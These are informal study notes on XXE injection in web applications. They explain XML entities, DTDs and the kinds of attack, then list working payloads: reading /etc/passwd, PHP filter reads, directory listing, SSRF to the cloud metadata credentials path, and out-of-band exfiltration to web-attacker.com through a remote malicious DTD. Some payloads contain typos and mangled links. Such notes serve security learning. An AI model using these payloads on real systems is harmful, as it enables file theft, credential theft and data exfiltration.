### XXE vulnerability 

xml- “extensible markup language”. design for storing and transporting data., it has no pre-defined tags, it lets you define own tags.

 ### XML entities ?

- XML entities are a way of representing an item of data within an XML document
- It is built-in entities in xml like <; and >; user for less that and grater then in xml
    
    example: <Product Id> 
    

### Type of entities:

- Internal - entities define within local DTD. the main purpose of the internal entity is to transfer same content again and again like the name of org. lwe can define any where to call the txt and insert the value ex: <!ENTITY foo “bar”> <product>&foo;</product>. make sure entity must be close.
- external - declared outside of local DTD ex: <!ENTITY foo SYSTEM “file:///etc/passwd>. but we use two entity one is internal to call data and other is external entity to fatch data from the system.
- parameter - declared into the parameter based entities <! ENTITY % name “entity_value”>

### Document type definition(DTD):

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. 

- it is used to declared the structure of xml. Type of data value it contain.
- can also defining outside of the XML using <!DOCTYPE>
- DTD is declared with in the optional DOCTYPE element  at the starting of the XML doc.

### XML injection:

![xxe-injection.svg](https://prod-files-secure.s3.us-west-2.amazonaws.com/f2f7edc7-a7f6-434a-9e44-8b75ab7b3bac/a6751eec-683f-435b-b991-fff952479509/xxe-injection.svg)

### Impact:

sensitive Data Exposure, Access to infrastructure, Remote code execution, Server Side Request Forgery.

**why this vulnerability arise;**

Some applications use the XML format to transmit data between the browser and the server.

**when user input is inserted into a server-side XML document or SOAP message in an unsafe way. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.** 

**type of XXE attacks?**

- **Exploiting XXE to retrieve filed**: where an external entity is defined containing the contents of a  file, and returned in the application's response
- **SSRF attack through XXE:** where an external entity is defined based on a URL to a back-end system.
- **exploiting blind xxe exfiltrate Data out-of-band:** where sensitive data is transmitted from the application server to a system that the attacker controls.
- **Retrieve data via error messages:** where the attacker can trigger a parsing error message containing sensitive data.
  
### Main attacks of XXE
# Main attack of XML

first check for new Entity 

- <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY to replace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>

##### read file:

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>

##### this case use to extrect a file if server uses PHP

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>

#####  third case notice we are declaring the `Element stockCheck` as ANY

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>exploit to retrieve the /etc/passwd file::

##### Directory listing (for java based application)

**list the contents of a directory** via XXE with a payload

<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>

##### SSRF

XXE is to abuse a ssrf inside  a cloud:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

##### Blind SSRF

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "[http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net](http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net/)"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>

 ##### "Blind" SSRF - Exfiltrate data out-of-band
    
    Exfiltrate the content of the the /etc/hostname file:
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM '[http://web-attacker.com/?x=%file;'](http://web-attacker.com/?x=%25file;%27)>">
    %eval;
    %exfiltrate;
    
- To upload malicious.dtd

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>

##### commaon exploit

- <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
- <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com">]>
- <! DOCTYPE root-element [element-declarations]>

### refrence:

https://www.w3resource.com/xml/internal-entities.php
https://d0znpp.medium.com/a4-xml-external-entities-xxe-%EF%B8%8F-top-10-owasp-2017-b9c293c27b0f
https://rohitcoder.medium.com/comprehensive-guide-detecting-fixing-and-defending-against-xxe-attacks-in-python-and-java-e78691b4b918
